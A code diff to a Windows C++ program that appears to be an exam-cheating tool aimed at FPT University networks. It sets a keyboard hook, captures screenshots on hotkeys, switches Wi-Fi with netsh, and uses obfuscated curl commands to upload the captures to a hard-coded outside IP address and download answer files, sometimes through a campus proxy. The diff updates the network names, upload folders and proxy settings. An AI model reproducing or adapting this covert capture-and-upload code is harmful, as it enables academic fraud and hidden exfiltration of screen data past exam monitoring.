@@ -68,7 +68,7 @@ LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 			
 		}
 	}
-	return CallNextHookEx(hHook, nCode, wParam, lParam);
+	return	 CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 HINSTANCE g_hInst = NULL;
 void take_picture(int &i)
@@ -101,7 +101,7 @@ void take_picture(int &i)
 	encoderParameters.Parameter[0].Guid = EncoderQuality;
 	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
 	encoderParameters.Parameter[0].NumberOfValues = 1;
-	quality = 100;
+	quality = 25;
 	encoderParameters.Parameter[0].Value = &quality;
 	std::string file;
 
@@ -120,6 +120,7 @@ void take_picture(int &i)
 	file = x + std::to_string(i);
 	char cmd[512];
 	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
+	//sprintf(cmd, "conhost %s.jpeg -o %s.webp", file, file);
 	system(cmd);
 
 	sprintf(cmd, "del %s.jpeg", file);
@@ -198,8 +199,8 @@ void gdiscreen()
 			//FU-Students
 			//FPT University
 			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
 			type = 1;
 			Sleep(100);
 		}
@@ -208,16 +209,16 @@ void gdiscreen()
 			//FPTU-EXAMONLINE
 			//FU-Exam
 			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
 		
 			Sleep(100);
 		}
 		if (get_key(VK_F7))//Connect to wifi exam
 		{
 			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "k123" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "k123" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
 			type = 2;
 			Sleep(100);
 		}
@@ -267,8 +268,8 @@ void gdiscreen()
 				s = "";
 				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"
 				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
-				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20  http://103.143.143.227:80/up.php?floder="uploads/bi_012/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/bi_012/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
 				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
 				else continue;
 				newfile2.open("stats.txt", std::ios::in);
@@ -311,14 +312,14 @@ void gdiscreen()
 			system("del wlan.txt");
 			printf("------------------------DOWNLOAD------------------\n");
 			char cmd[500];
-			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227/bi_012.txt -o "work.txt"")"));
-			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/bi_012.txt -o "work.txt"")"));
+			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
+			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
 			system(cmd);
 			printf("--------------------------------------------------");
 			Sleep(100);	
 		}
 
-		if (get_key	(VK_OEM_3) || get_key(VK_LMENU))
+		if (get_key(VK_OEM_3) || get_key(VK_LMENU))
 		{
 			take_picture(i);
 			Sleep(100);
@@ -393,7 +394,7 @@ int main()
 		std::string key;
 		printf(AY_OBFUSCATE("key:"));
 		std::cin >> key;
-		const char *x = AY_OBFUSCATE("bi_012");
+		const char *x = AY_OBFUSCATE("new_hl839");
 		if (key == x)
 		{
 			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
